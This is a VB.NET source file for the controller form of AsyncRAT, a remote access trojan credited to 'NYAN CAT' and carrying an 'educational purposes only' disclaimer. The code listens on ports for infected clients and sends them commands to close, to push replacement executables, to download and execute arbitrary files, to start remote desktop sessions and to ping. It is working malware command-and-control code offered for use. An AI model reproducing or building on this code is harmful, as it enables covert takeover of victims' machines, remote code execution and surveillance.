Imports System.ComponentModel
Imports System.IO

'

'       │ Author     : NYAN CAT
'       │ Name       : AsyncRAT

'       Contact Me   : https://github.com/NYAN-x-CAT

'       This program is distributed for educational purposes only.

'

Public Class Form1
    Public S As Server

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Messages.F = Me

        Pending.Req_In = New List(Of Incoming_Requests)
        Dim Req_In As New Threading.Thread(New Threading.ParameterizedThreadStart(AddressOf Pending.Incoming))
        Req_In.Start()

        Pending.Req_Out = New List(Of Outcoming_Requests)
        Dim Req_Out As New Threading.Thread(New Threading.ParameterizedThreadStart(AddressOf Pending.OutComing))
        Req_Out.Start()

        For Each i In Settings.Ports.ToList
            S = New Server
            Dim listener As New Threading.Thread(New Threading.ParameterizedThreadStart(AddressOf S.Start))
            listener.Start(i)
        Next

    End Sub

    Private Sub CLOSEToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CLOSEToolStripMenuItem.Click
        If LV1.SelectedItems.Count > 0 Then
            Try
                Dim B As Byte() = SB("CLOSE")
                For Each C As ListViewItem In LV1.SelectedItems
                    '   Dim x As Client = CType(C.Tag, Client)
                    Try
                        Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                        Pending.Req_Out.Add(ClientReq)
                        '  x.Send(B)
                    Catch ex As Exception
                    End Try
                Next
            Catch ex As Exception
            End Try
        End If
    End Sub

    Private Sub UPDATEToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles UPDATEToolStripMenuItem.Click
        If LV1.SelectedItems.Count > 0 Then
            Try

                Dim o As New OpenFileDialog
                With o
                    .Filter = "(*.exe)|*.exe"
                    .Title = "Update Client"
                End With

                If o.ShowDialog = Windows.Forms.DialogResult.OK Then
                    Dim B As Byte() = SB("UPDATE" & Settings.SPL & Convert.ToBase64String(File.ReadAllBytes(o.FileName)))

                    For Each C As ListViewItem In LV1.SelectedItems
                        Try
                            Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                            Pending.Req_Out.Add(ClientReq)
                        Catch ex As Exception
                        End Try
                    Next
                End If
            Catch ex As Exception
            End Try
        End If
    End Sub

    Private Sub DownloadAndExecuteToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DownloadAndExecuteToolStripMenuItem.Click
        If LV1.SelectedItems.Count > 0 Then
            Try

                Dim o As New OpenFileDialog
                With o
                    .Filter = "(*.*)|*.*"
                    .Title = "Download and Execute"
                End With

                If o.ShowDialog = Windows.Forms.DialogResult.OK Then
                    Dim B As Byte() = SB("DW" & Settings.SPL & Path.GetExtension(o.FileName) & Settings.SPL & Convert.ToBase64String(File.ReadAllBytes(o.FileName)))

                    For Each C As ListViewItem In LV1.SelectedItems
                        Try
                            Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                            Pending.Req_Out.Add(ClientReq)
                        Catch ex As Exception
                        End Try
                    Next
                End If
            Catch ex As Exception
            End Try
        End If
    End Sub

    Private Sub RemoteDesktopToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RemoteDesktopToolStripMenuItem.Click
        If LV1.SelectedItems.Count > 0 Then
            Try

                Dim B As Byte() = SB("RD-")

                For Each C As ListViewItem In LV1.SelectedItems
                    Try
                        Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                        Pending.Req_Out.Add(ClientReq)
                    Catch ex As Exception
                    End Try
                Next

            Catch ex As Exception
            End Try
        End If
    End Sub

    Private Sub Timer_Status_Tick(sender As Object, e As EventArgs) Handles Timer_Status.Tick
        Try
            ToolStripStatusLabel1.Text = String.Format("Total Clients [{0}]       Selected Clients [{1}]       Listening Ports [{2}]", LV1.Items.Count.ToString, LV1.SelectedItems.Count.ToString, String.Join(",", Settings.Ports.ToList))
            Text = "AsyncRAT  // NYAN CAT  // " + DateTime.Now
        Catch ex As Exception
        End Try
    End Sub

    Private Sub Timer_Ping_Tick(sender As Object, e As EventArgs) Handles Timer_Ping.Tick
        If LV1.Items.Count > 0 Then
            Try

                Dim B As Byte() = SB("PING!")
                For Each C As ListViewItem In LV1.Items
                    Try
                        Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                        Pending.Req_Out.Add(ClientReq)
                    Catch ex As Exception
                    End Try
                Next

            Catch ex As Exception
            End Try
        End If
    End Sub

    Private Sub Form1_Closing(sender As Object, e As CancelEventArgs) Handles Me.Closing
        Try
            Environment.Exit(0)
        Catch ex As Exception
        End Try
    End Sub

    Private Sub LV1_MouseMove(sender As Object, e As MouseEventArgs) Handles LV1.MouseMove
        Try
            Dim hitInfo = LV1.HitTest(e.Location)
            If e.Button = MouseButtons.Left AndAlso (hitInfo.Item IsNot Nothing OrElse hitInfo.SubItem IsNot Nothing) Then LV1.Items(hitInfo.Item.Index).Selected = True
        Catch ex As Exception
        End Try
    End Sub

    Private Sub AboutToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles AboutToolStripMenuItem.Click
        MsgBox("


       │ Author     : NYAN CAT
       │ Name       : AsyncRAT

       │ Contact Me   : https://github.com/NYAN-x-CAT

       │ This program is distributed for educational purposes only.


")
    End Sub

End Class
